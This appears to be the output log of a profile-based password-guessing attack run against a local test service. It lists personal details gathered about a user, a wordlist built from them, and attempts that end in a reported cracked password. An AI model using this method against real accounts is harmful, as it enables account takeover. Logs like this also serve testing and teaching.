Known Password Attack Log
Target: 127.0.0.1:8081
Username: john.smith
Intelligence Gathering: Successful
Attack started: 2025-07-29 13:26:23
Total attempts: 198
Password candidates generated: 239
Success: Yes
Found password: John1985!

==================================================
Target Intelligence:
==================================================
full_name: John Smith
first_name: John
last_name: Smith
birth_year: 1985
birth_date: 15031985
age: 39
pet_name: Buddy
hometown: Boston
current_city: Boston
favorite_team: Patriots
company: TechCorp
job_title: Developer
interests: ['technology', 'football', 'gaming']
common_numbers: ['15', '03', '1985', '85']

==================================================
Generated Password Candidates:
==================================================
 1. Buddy1985
 2. Patriots1234
 3. JOHN#
 4. 01John
 5. John85!
 6. 4567John
 7. Buddy#
 8. Boston1985$
 9. 90John
10. Buddy85#
11. John789
12. john789
13. Buddy$
14. John23
15. techcorp85
16. John1985#
17. John#85
18. john012
19. 789John
20. 90john
21. John85#
22. 67John
23. Buddy85@
24. 123john
25. 0123john
26. Techcorp85
27. 012John
28. Boston1985!
29. JohnTechcorp
30. Boston1985*
31. JohnSmith12345
32. passwordJohn
33. 01john
34. John2345
35. Boston85!
36. John45
37. 1985john
38. 56John
39. 7890John
40. 9012john
41. john2345
42. 23John
43. John34
44. 56john
45. john3456
46. john!85
47. john1985
48. John!85
49. john234
50. John#24
51. john456
52. john67
53. john34
54. BOSTON85
55. 8901john
56. John901
57. johntechcorp
58. 1503
59. John567
60. John890
61. boston85
62. 901john
63. johnpassword
64. JOHN1985
65. 890john
66. 0123John
67. John!24
68. Boston85*
69. 5678john
70. Patriots12345
71. Buddy*
72. Buddy@
73. John78
74. John01
75. 012john
76. JohnJohn85
77. TECHCORP85
78. 345john
79. Techcorp1985
80. john901
81. JOHN@
82. 85john
83. BUDDY2024
84. john7890
85. john12
86. john#85
87. John$24
88. 789john
89. John123!
90. 89john
91. john890
92. Buddy@85
93. BUDDY85
94. John8901
95. 890John
96. 9012John
97. Buddy85!
98. 2345john
99. John90
100. BOSTON1985
101. Buddy2024
102. 4567john
103. John012
104. JOHN$
105. john01
106. 3456john
107. 12John
108. john45
109. John85*
110. John123
111. john123!
112. john5678
113. John1985*
114. 1John85
115. John85$
116. 34john
117. 6789john
118. John$85
119. 78John
120. John345
121. 123john85
122. TECHCORP1985
123. Patriots1985
124. Buddy85$
125. johnjohn
126. 23john
127. 1john
128. John4567
129. John@24
130. Patriots123
131. Johnpassword
132. 123John85
133. John56
134. JohnSmith1234
135. john$
136. Boston1985@
137. 123John
138. JohnSmith85
139. john*85
140. 1985John
141. boston1985
142. john678
143. John89
144. john8901
145. 567john
146. 345John
147. 45John
148. John456
149. 678john
150. 901John
151. John12
152. Boston1985#
153. 1234John
154. John*85
155. 34John
156. JOHN*
157. John1985@
158. 678John
159. john90
160. John6789
161. Patriots85
162. john@
163. 85John
164. John0123
165. johnjohn85
166. Johnpass
167. John1985$
168. 1985
169. 5678John
170. john@85
171. 7890john
172. john0123
173. john*
174. JohnSmith123
175. john9012
176. Boston85@
177. John2024
178. 456John
179. 12John85
180. John67
181. JOHN85
182. 12john85
183. John1234
184. 2345John
185. Boston85$
186. Boston85#
187. buddy85
188. john567
189. 567John
190. techcorp1985
191. JOHN2024
192. BUDDY1985
193. john4567
194. John678
195. 3456John
196. 1John
197. passwordjohn
198. John1985!
199. john2024
200. john56
201. John*24
202. john23
203. 45john
204. JohnJohn
205. 234john
206. 89John
207. john!
208. john78
209. john6789
210. John7890
211. buddy1985
212. 234John
213. john85
214. 12john
215. 456john
216. Buddy85*
217. John234
218. John85@
219. 1john85
220. john#
221. john345
222. 78john
223. John@85
224. Buddy!
225. 8901John
226. John5678
227. John3456
228. johnpass
229. 67john
230. buddy2024
231. John9012
232. 15031985
233. john1234
234. 6789John
235. 1234john
236. john89
237. john123
238. JOHN!
239. john$85

==================================================
Detailed Attempt Log:
==================================================
[2025-07-29 13:26:23] Attempt #1: john.smith:Buddy1985 - FAILED (Pattern: BirthYear + PetName) (Response: 0.001s)
[2025-07-29 13:26:25] Attempt #2: john.smith:Patriots1234 - FAILED (Pattern: FavoriteTeam + CommonNumbers) (Response: 0.004s)
[2025-07-29 13:26:26] Attempt #3: john.smith:JOHN# - FAILED (Pattern: Special) (Response: 0.004s)
[2025-07-29 13:26:28] Attempt #4: john.smith:01John - FAILED (Pattern: FirstName) (Response: 0.004s)
[2025-07-29 13:26:30] Attempt #5: john.smith:John85! - FAILED (Pattern: FirstName + BirthYear(short) + Special) (Response: 0.002s)
[2025-07-29 13:26:31] Attempt #6: john.smith:4567John - FAILED (Pattern: FirstName) (Response: 0.004s)
[2025-07-29 13:26:32] Attempt #7: john.smith:Buddy# - FAILED (Pattern: PetName + Special) (Response: 0.004s)
[2025-07-29 13:26:34] Attempt #8: john.smith:Boston1985$ - FAILED (Pattern: BirthYear + Hometown + Special) (Response: 0.003s)
[2025-07-29 13:26:35] Attempt #9: john.smith:90John - FAILED (Pattern: FirstName) (Response: 0.004s)
[2025-07-29 13:26:37] Attempt #10: john.smith:Buddy85# - FAILED (Pattern: BirthYear(short) + PetName + Special) (Response: 0.004s)
[2025-07-29 13:26:37] Attempt #11: john.smith:John789 - FAILED (Pattern: FirstName) (Response: 0.003s)
[2025-07-29 13:26:39] Attempt #12: john.smith:john789 - FAILED (Pattern: Unknown) (Response: 0.001s)
[2025-07-29 13:26:40] Attempt #13: john.smith:Buddy$ - FAILED (Pattern: PetName + Special) (Response: 0.003s)
[2025-07-29 13:26:42] Attempt #14: john.smith:John23 - FAILED (Pattern: FirstName) (Response: 0.004s)
[2025-07-29 13:26:44] Attempt #15: john.smith:techcorp85 - FAILED (Pattern: BirthYear(short)) (Response: 0.004s)
[2025-07-29 13:26:45] Attempt #16: john.smith:John1985# - FAILED (Pattern: FirstName + BirthYear + Special) (Response: 0.003s)
[2025-07-29 13:26:46] Attempt #17: john.smith:John#85 - FAILED (Pattern: FirstName + BirthYear(short) + Special) (Response: 0.003s)
[2025-07-29 13:26:47] Attempt #18: john.smith:john012 - FAILED (Pattern: Unknown) (Response: 0.003s)
[2025-07-29 13:26:48] Attempt #19: john.smith:789John - FAILED (Pattern: FirstName) (Response: 0.003s)
[2025-07-29 13:26:49] Attempt #20: john.smith:90john - FAILED (Pattern: Unknown) (Response: 0.004s)
[2025-07-29 13:26:50] Attempt #21: john.smith:John85# - FAILED (Pattern: FirstName + BirthYear(short) + Special) (Response: 0.003s)
